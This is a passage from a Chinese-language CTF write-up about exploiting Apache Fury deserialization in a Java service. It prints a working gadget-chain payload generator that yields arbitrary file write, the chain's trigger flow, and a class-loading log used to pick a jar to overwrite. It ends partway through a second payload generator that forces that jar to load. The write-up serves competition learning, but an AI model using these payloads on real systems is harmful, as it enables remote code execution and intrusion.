</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 3. Setup TiedMapEntry</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TiedMapEntry</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TiedMapEntry</span><span class=p>(</span><span class=n>lazyMap</span><span class=p>,</span><span class=w> </span><span class=n>filename</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 4. Setup Comparator and Transformer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// StringValueTransformer calls String.valueOf(obj) which calls obj.toString() (if not null)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>commons</span><span class=p>.</span><span class=na>collections</span><span class=p>.</span><span class=na>Transformer</span><span class=w> </span><span class=n>transformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>StringValueTransformer</span><span class=p>.</span><span class=na>getInstance</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TransformingComparator</span><span class=w> </span><span class=n>comparator</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformingComparator</span><span class=p>(</span><span class=n>transformer</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 5. Setup PriorityQueue</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>PriorityQueue</span><span class=w> </span><span class=n>queue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PriorityQueue</span><span class=p>(</span><span class=n>2</span><span class=p>,</span><span class=w> </span><span class=n>comparator</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>sizeField</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>PriorityQueue</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;size&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>sizeField</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>sizeField</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>queue</span><span class=p>,</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>queueField</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>PriorityQueue</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;queue&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queueField</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>queueArray</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>2</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queueArray</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>entry</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queueArray</span><span class=o>[</span><span class=n>1</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>entry</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queueField</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>queue</span><span class=p>,</span><span class=w> </span><span class=n>queueArray</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 6. Serialize with Fury</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;Serializing AspectJ Chain with Fury...&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Fury</span><span class=w> </span><span class=n>fury</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Fury</span><span class=p>.</span><span class=na>builder</span><span class=p>().</span><span class=na>withLanguage</span><span class=p>(</span><span class=n>Language</span><span class=p>.</span><span class=na>JAVA</span><span class=p>).</span><span class=na>requireClassRegistration</span><span class=p>(</span><span class=kc>false</span><span class=p>).</span><span class=na>build</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>serializedInfo</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fury</span><span class=p>.</span><span class=na>serialize</span><span class=p>(</span><span class=n>queue</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>b64</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getEncoder</span><span class=p>().</span><span class=na>encodeToString</span><span class=p>(</span><span class=n>serializedInfo</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>FileOutputStream</span><span class=w> </span><span class=n>fos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=s>&#34;payload_aj.b64&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>fos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>b64</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>fos</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;AspectJ Payload saved to payload_aj.b64&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><strong>利用链触发流程</strong>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>PriorityQueue.readObject()
</span></span><span class=line><span class=cl>  → heapify()
</span></span><span class=line><span class=cl>  → siftDown()
</span></span><span class=line><span class=cl>  → comparator.compare(queue[0], queue[1])
</span></span><span class=line><span class=cl>  → TransformingComparator.compare()
</span></span><span class=line><span class=cl>  → StringValueTransformer.transform(TiedMapEntry)
</span></span><span class=line><span class=cl>  → String.valueOf(TiedMapEntry)
</span></span><span class=line><span class=cl>  → TiedMapEntry.toString()
</span></span><span class=line><span class=cl>  → TiedMapEntry.getValue()
</span></span><span class=line><span class=cl>  → LazyMap.get(key)
</span></span><span class=line><span class=cl>  → factory.create()                    [ConstantFactory 返回预设的 byte[]]
</span></span><span class=line><span class=cl>  → StoreableCachingMap.put(key, value)
</span></span><span class=line><span class=cl>  → 写入文件 key，内容为 value
</span></span></code></pre></td></tr></table></div></div><p>有了写文件能力，我以为胜券在握。尝试了包括但不限于计划任务、LD_Preload、charsets.jar 等各种写入姿势，结果竟无一奏效。苦也！这波折腾直接把狂子写到怀疑人生，当时心凉半截，只道是这一血要拱手让人了</p><p><img src=/img/2026-alictf/5.png alt=img></p><p>正所谓山重水复疑无路，柳暗花明又一村。绝境中忽忆起一篇 FastJson 写入绕过的文章，妙招在于开启 <code>-verbose:class</code> 参数，通过监控类加载情况，精准定位未被加载的 JAR 包实施覆盖利用。</p><p>通过监控类加载情况，<code>dnsns.jar</code> 没有被加载！</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Prolog data-lang=Prolog><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>java</span><span class=p>.</span><span class=s>util</span><span class=p>.</span><span class=s>concurrent</span><span class=p>.</span><span class=nv>ThreadPoolExecutor</span><span class=err>$</span><span class=nv>AbortPolicy</span> <span class=s>from</span> <span class=o>/</span><span class=s>usr</span><span class=o>/</span><span class=s>local</span><span class=o>/</span><span class=s>openjdk</span><span class=o>-</span><span class=mi>8</span><span class=o>/</span><span class=s>jre</span><span class=o>/</span><span class=s>lib</span><span class=o>/</span><span class=s>rt</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>java</span><span class=p>.</span><span class=s>util</span><span class=p>.</span><span class=s>concurrent</span><span class=p>.</span><span class=nv>ThreadPoolExecutor</span><span class=err>$</span><span class=nv>CallerRunsPolicy</span> <span class=s>from</span> <span class=o>/</span><span class=s>usr</span><span class=o>/</span><span class=s>local</span><span class=o>/</span><span class=s>openjdk</span><span class=o>-</span><span class=mi>8</span><span class=o>/</span><span class=s>jre</span><span class=o>/</span><span class=s>lib</span><span class=o>/</span><span class=s>rt</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>java</span><span class=p>.</span><span class=s>util</span><span class=p>.</span><span class=s>concurrent</span><span class=p>.</span><span class=nv>ThreadPoolExecutor</span><span class=err>$</span><span class=nv>DiscardOldestPolicy</span> <span class=s>from</span> <span class=o>/</span><span class=s>usr</span><span class=o>/</span><span class=s>local</span><span class=o>/</span><span class=s>openjdk</span><span class=o>-</span><span class=mi>8</span><span class=o>/</span><span class=s>jre</span><span class=o>/</span><span class=s>lib</span><span class=o>/</span><span class=s>rt</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>java</span><span class=p>.</span><span class=s>util</span><span class=p>.</span><span class=s>concurrent</span><span class=p>.</span><span class=nv>ThreadPoolExecutor</span><span class=err>$</span><span class=nv>DiscardPolicy</span> <span class=s>from</span> <span class=o>/</span><span class=s>usr</span><span class=o>/</span><span class=s>local</span><span class=o>/</span><span class=s>openjdk</span><span class=o>-</span><span class=mi>8</span><span class=o>/</span><span class=s>jre</span><span class=o>/</span><span class=s>lib</span><span class=o>/</span><span class=s>rt</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>org</span><span class=p>.</span><span class=s>jboss</span><span class=p>.</span><span class=s>threads</span><span class=p>.</span><span class=nv>JBossExecutors</span><span class=err>$</span><span class=mi>3</span> <span class=s>from</span> <span class=nn>file</span><span class=p>:</span><span class=o>/</span><span class=s>app</span><span class=o>/</span><span class=s>app</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>org</span><span class=p>.</span><span class=s>jboss</span><span class=p>.</span><span class=s>threads</span><span class=p>.</span><span class=nv>NullRunnable</span> <span class=s>from</span> <span class=nn>file</span><span class=p>:</span><span class=o>/</span><span class=s>app</span><span class=o>/</span><span class=s>app</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>org</span><span class=p>.</span><span class=s>jboss</span><span class=p>.</span><span class=s>threads</span><span class=p>.</span><span class=nv>JBossExecutors</span><span class=err>$</span><span class=mi>5</span> <span class=s>from</span> <span class=nn>file</span><span class=p>:</span><span class=o>/</span><span class=s>app</span><span class=o>/</span><span class=s>app</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>java</span><span class=p>.</span><span class=s>lang</span><span class=p>.</span><span class=nv>IllegalAccessError</span> <span class=s>from</span> <span class=o>/</span><span class=s>usr</span><span class=o>/</span><span class=s>local</span><span class=o>/</span><span class=s>openjdk</span><span class=o>-</span><span class=mi>8</span><span class=o>/</span><span class=s>jre</span><span class=o>/</span><span class=s>lib</span><span class=o>/</span><span class=s>rt</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>org</span><span class=p>.</span><span class=s>jboss</span><span class=p>.</span><span class=s>threads</span><span class=p>.</span><span class=nv>LoggingUncaughtExceptionHandler</span> <span class=s>from</span> <span class=nn>file</span><span class=p>:</span><span class=o>/</span><span class=s>app</span><span class=o>/</span><span class=s>app</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>org</span><span class=p>.</span><span class=s>wildfly</span><span class=p>.</span><span class=s>common</span><span class=p>.</span><span class=s>cpu</span><span class=p>.</span><span class=nv>ProcessorInfo</span> <span class=s>from</span> <span class=nn>file</span><span class=p>:</span><span class=o>/</span><span class=s>app</span><span class=o>/</span><span class=s>app</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>sun</span><span class=p>.</span><span class=s>nio</span><span class=p>.</span><span class=s>cs</span><span class=p>.</span><span class=nv>US_ASCII</span><span class=err>$</span><span class=nv>Decoder</span> <span class=s>from</span> <span class=o>/</span><span class=s>usr</span><span class=o>/</span><span class=s>local</span><span class=o>/</span><span class=s>openjdk</span><span class=o>-</span><span class=mi>8</span><span class=o>/</span><span class=s>jre</span><span class=o>/</span><span class=s>lib</span><span class=o>/</span><span class=s>rt</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>org</span><span class=p>.</span><span class=s>jboss</span><span class=p>.</span><span class=s>threads</span><span class=p>.</span><span class=nv>Version</span> <span class=s>from</span> <span class=nn>file</span><span class=p>:</span><span class=o>/</span><span class=s>app</span><span class=o>/</span><span class=s>app</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>org</span><span class=p>.</span><span class=s>jboss</span><span class=p>.</span><span class=s>threads</span><span class=p>.</span><span class=nv>Messages</span> <span class=s>from</span> <span class=nn>file</span><span class=p>:</span><span class=o>/</span><span class=s>app</span><span class=o>/</span><span class=s>app</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>org</span><span class=p>.</span><span class=s>jboss</span><span class=p>.</span><span class=s>threads</span><span class=p>.</span><span class=nv>Messages_</span><span class=err>$</span><span class=s>logger</span> <span class=s>from</span> <span class=nn>file</span><span class=p>:</span><span class=o>/</span><span class=s>app</span><span class=o>/</span><span class=s>app</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>org</span><span class=p>.</span><span class=s>jboss</span><span class=p>.</span><span class=s>threads</span><span class=p>.</span><span class=nv>StoppedExecutorException</span> <span class=s>from</span> <span class=nn>file</span><span class=p>:</span><span class=o>/</span><span class=s>app</span><span class=o>/</span><span class=s>app</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>org</span><span class=p>.</span><span class=s>jboss</span><span class=p>.</span><span class=s>threads</span><span class=p>.</span><span class=nv>EnhancedQueueExecutor</span><span class=err>$</span><span class=nv>MBeanUnregisterAction</span> <span class=s>from</span> <span class=nn>file</span><span class=p>:</span><span class=o>/</span><span class=s>app</span><span class=o>/</span><span class=s>app</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>org</span><span class=p>.</span><span class=s>jboss</span><span class=p>.</span><span class=s>threads</span><span class=p>.</span><span class=nv>EnhancedQueueExecutor</span><span class=err>$</span><span class=nv>MXBeanImpl</span> <span class=s>from</span> <span class=nn>file</span><span class=p>:</span><span class=o>/</span><span class=s>app</span><span class=o>/</span><span class=s>app</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>org</span><span class=p>.</span><span class=s>jboss</span><span class=p>.</span><span class=s>threads</span><span class=p>.</span><span class=nv>Waiter</span> <span class=s>from</span> <span class=nn>file</span><span class=p>:</span><span class=o>/</span><span class=s>app</span><span class=o>/</span><span class=s>app</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>java</span><span class=p>.</span><span class=s>util</span><span class=p>.</span><span class=s>concurrent</span><span class=p>.</span><span class=s>atomic</span><span class=p>.</span><span class=nv>Striped64</span> <span class=s>from</span> <span class=o>/</span><span class=s>usr</span><span class=o>/</span><span class=s>local</span><span class=o>/</span><span class=s>openjdk</span><span class=o>-</span><span class=mi>8</span><span class=o>/</span><span class=s>jre</span><span class=o>/</span><span class=s>lib</span><span class=o>/</span><span class=s>rt</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=mi>2026</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span> <span class=mi>13</span><span class=s>:</span><span class=mi>51</span><span class=s>:</span><span class=mi>14</span> <span class=p>[</span><span class=nv>Loaded</span> <span class=s>java</span><span class=p>.</span><span class=s>util</span><span class=p>.</span><span class=s>concurrent</span><span class=p>.</span><span class=s>atomic</span><span class=p>.</span><span class=nv>LongAdder</span> <span class=s>from</span> <span class=o>/</span><span class=s>usr</span><span class=o>/</span><span class=s>local</span><span class=o>/</span><span class=s>openjdk</span><span class=o>-</span><span class=mi>8</span><span class=o>/</span><span class=s>jre</span><span class=o>/</span><span class=s>lib</span><span class=o>/</span><span class=s>rt</span><span class=p>.</span><span class=s>jar</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><p>这意味着可以通过反序列化</p><p><code>sun.net.spi.nameservice.dns.DNSNameServiceDescriptor</code>触发<code>dnsns.jar</code>加载。这一记回马枪，直接让死局复活</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>reproduce</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.fury.Fury</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.fury.config.Language</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Base64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>ExpDNS</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;Generating payload to load sun.net.spi.nameservice.dns.DNSNameServiceDescriptor...&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Fury</span><span class=w> </span><span class=n>fury</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Fury</span><span class=p>.</span><span class=na>builder</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>withLanguage</span><span class=p>(</span><span class=n>Language</span><span class=p>.</span><span class=na>JAVA</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>requireClassRegistration</span><span class=p>(</span><span class=kc>false</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>build</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Load the class via reflection to avoid compilation errors if access is restricted</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>clazz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;sun.net.spi.nameservice.dns.DNSNameServiceDescriptor&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>instance</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>clazz</span><span class=p>.</span><span class=na>newInstance</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fury</span><span class=p>.</span><span class=na>serialize</span><span class=p>(</span><span class=n>instance</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>b64</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getEncoder</span><span class=p>().</span><span class=na>encodeToString</span><span class=p>(</span><span class=n>payload</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>(</span><span class=n>FileOutputStream</span><span class=w> </span><span class=n>fos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=s>&#34;payload_dns.b64&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>fos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>b64</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
